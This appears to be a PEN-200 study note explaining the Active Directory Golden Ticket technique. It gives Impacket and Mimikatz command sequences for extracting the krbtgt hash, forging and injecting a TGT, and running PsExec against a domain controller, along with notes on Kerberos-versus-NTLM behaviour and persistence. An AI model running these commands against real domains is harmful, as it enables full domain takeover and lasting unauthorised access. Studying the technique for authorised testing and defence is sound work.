# Golden Ticket

**The `krbtgt` account's secret is the key used by the KDC to protect domain TGTs.** If you obtain the `krbtgt` key/hash plus the Domain SID, you can forge your own TGTs and claim privileged group membership. PEN-200 presents this primarily as **Active Directory persistence**.

```text
Domain Admin / DC compromise
        ↓
obtain krbtgt secret + Domain SID
        ↓
forge TGT for an existing domain account
        ↓
inject/use forged TGT
        ↓
request normal TGS tickets
        ↓
domain-wide Kerberos access according to forged PAC/groups
```

A Golden Ticket is broader than a [[Silver Ticket & Diamond Ticket|Silver Ticket]]:

```text
Silver Ticket → forge one service-specific TGS using that service account's key
Golden Ticket → forge a TGT using krbtgt, then request tickets across the domain
```

---

## Requirements

```text
1. krbtgt NTLM/Kerberos key material
2. Domain SID
3. Existing domain username in current patched environments
```

You normally obtain the `krbtgt` secret after DA/DC compromise, for example through [[DCSync Attack|DCSync]] or [[NTDS.dit via VSS Shadow Copy|NTDS.dit/VSS]].

Once you already possess the `krbtgt` material and Domain SID, PEN-200 notes that **forging/injecting the Golden Ticket itself does not require local administrative privileges and can be performed from a non-domain-joined machine**.

---

## Linux / Impacket

```bash
impacket-ticketer -nthash <KRBTGT_NTLM_HASH> \
    -domain-sid S-1-5-21-XXX-XXX-XXX \
    -domain <DOMAIN> <EXISTING_USER>

export KRB5CCNAME=<EXISTING_USER>.ccache
impacket-psexec -k -no-pass <DOMAIN>/<EXISTING_USER>@<DC_FQDN>
```

Use an **existing user account** for the forged identity on modern patched domains.

---

## Windows / Mimikatz — PEN-200 workflow

### 1. Extract `krbtgt` and Domain SID after DC/DA compromise

```text
privilege::debug
lsadump::lsa /patch
```

Record:

```text
Domain SID
krbtgt NTLM hash
```

### 2. On the machine where you want to use the ticket, purge old tickets

```text
kerberos::purge
```

### 3. Forge and inject the Golden Ticket

```text
kerberos::golden /user:<EXISTING_USER> /domain:<DOMAIN_FQDN> \
  /sid:<DOMAIN_SID> /krbtgt:<KRBTGT_NTLM> /ptt
```

Mimikatz's Golden Ticket defaults include privileged group IDs such as **Domain Admins**; inspect the generated group membership rather than assuming the current local token represents it.

Optionally launch a command shell from Mimikatz:

```text
misc::cmd
```

Verify the ticket:

```powershell
klist
```

Then use a Kerberos-aware remote-execution path:

```powershell
PsExec.exe \\<DC_HOSTNAME> cmd.exe
```

---

## Hostname vs IP — critical Kerberos detail

```text
PsExec.exe \\dc01.corp.local ...   → Kerberos can be used
PsExec.exe \\192.168.x.x ...       → commonly falls back to NTLM
```

PEN-200 demonstrates the forged ticket succeeding against the **DC hostname** while the same access fails when the DC is addressed by IP because NTLM is selected instead. A valid Golden Ticket does not help an NTLM authentication attempt.

---

## Persistence significance

The `krbtgt` password is not automatically rotated whenever an administrator changes their own password. Therefore a stolen `krbtgt` secret can remain useful for persistence until the domain's `krbtgt` secret is deliberately rotated/invalidated.

> [!important]
> Treat `krbtgt` material as full-domain compromise. On an exam, obtaining it usually means you already have DA/DC-level control; prioritize proof/evidence and only use persistence techniques when they are relevant to the objective.

See [[Overpass-the-Hash]], [[pass-the-ticket]], and [[Active Directory/AD Authentication — NTLM, Kerberos & LSASS|AD Authentication — NTLM, Kerberos & LSASS]].
